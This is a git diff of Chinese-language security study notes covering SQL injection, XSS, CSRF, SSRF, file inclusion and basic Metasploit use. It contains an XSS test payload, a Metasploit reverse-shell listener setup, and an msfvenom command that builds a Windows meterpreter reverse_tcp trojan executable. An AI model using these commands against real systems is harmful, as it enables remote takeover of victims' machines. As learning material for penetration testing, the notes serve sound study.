@@ -105,35 +105,35 @@
 ## SQL注入&繞過原理
 
 1. 甚麼是SQL
-- SQL(Structured Query Language)結構化查詢語言，使我們有能力訪問數據庫
+    - SQL(Structured Query Language)結構化查詢語言，使我們有能力訪問數據庫
 
 2. 甚麼是SQL注入
-- 用戶提交的數據可以被數據庫解析執行
+    - 用戶提交的數據可以被數據庫解析執行
 
 3. 加強自學內容
-- 了解SQL語句
-- 透過SQL語句繞過資料庫執行漏洞
+    - 了解SQL語句
+    - 透過SQL語句繞過資料庫執行漏洞
 
 4. 補充: NoSQL注入
 
 ## XSS漏洞原理
 
 1. 甚麼事XSS
-- XSS(Cross Site Script)跨站腳本攻擊，網頁內嵌入HTML、CSS、JS代碼
+    - XSS(Cross Site Script)跨站腳本攻擊，網頁內嵌入HTML、CSS、JS代碼
 
 2. XSS類型
-- 反射型: 前端-> 後端 -> 前端
-- 儲存型: 前端 -> 後端 -> 資料庫 -> 前端
-- DOM型: 前端
+    - 反射型: 前端-> 後端 -> 前端
+    - 儲存型: 前端 -> 後端 -> 資料庫 -> 前端
+    - DOM型: 前端
 
 3. XSS舉例:
-- 再輸入框輸入 ```<script>alert(1)</script>```
-- 進階: 綁定Beef轉換成監聽木馬
+    - 再輸入框輸入 ```<script>alert(1)</script>```
+    - 進階: 綁定Beef轉換成監聽木馬
 
 ## CSRF漏洞原理
 
 1. 甚麼是CSRF
-- CSRF(Cross Site Request Forgery)跨站請求違造，攻擊者盜用你的身份，以你的名義發送惡意請求
+    - CSRF(Cross Site Request Forgery)跨站請求違造，攻擊者盜用你的身份，以你的名義發送惡意請求
 
 ## WEBCAM入侵原理
 - 結合網路以及攝影機技術所產生的新一代攝影機，其實只要連線上網路的設備滲透原理基本上都是相通的
@@ -144,7 +144,50 @@
     - 指紋篩選
     - 暴力破解、字典破解 
 
+## 代碼審計漏洞
 
+1. 甚麼是代碼審計
+    - 透過檢查源代碼發現發現源代碼缺陷引發的安全漏洞
 
+2. 提升方向
+    - 熟悉編程語言
+    - 熟悉風險代碼操作
+    - 熟悉設計模式
 
+## 文件包含漏洞
 
+1. 甚麼是文件包含漏洞
+    - 本地/遠程文件包含檔案(include)
+
+## SSRF漏洞
+
+1. 甚麼是SSRF
+    - SSRF(Server-Side Request Forgery)服務端請求偽造    
+
+# Metasploit
+- kali Linux 自帶的後門木馬管理工具
+
+## 啟動Metasploit
+```cmd
+msfconsole
+```
+- -q 省略開啟時的文字訊息
+
+## 使用模組
+```cmd
+use exploit/multi/handler
+```
+- 可以透過 show options 展示當前配置
+
+## 設置模組
+```cmd
+set lhost ip
+set lport port (默認4444)
+set payload (payload)
+```
+- 透過 show payloads 展示所有可用payload
+
+## 製作木馬
+```cmd
+msfvenom -p windows/x64/meterpeter/reverse_tcp -f exe -a x64 --platform windows -o ./demo.exe lhost=ip lport=port 
+```
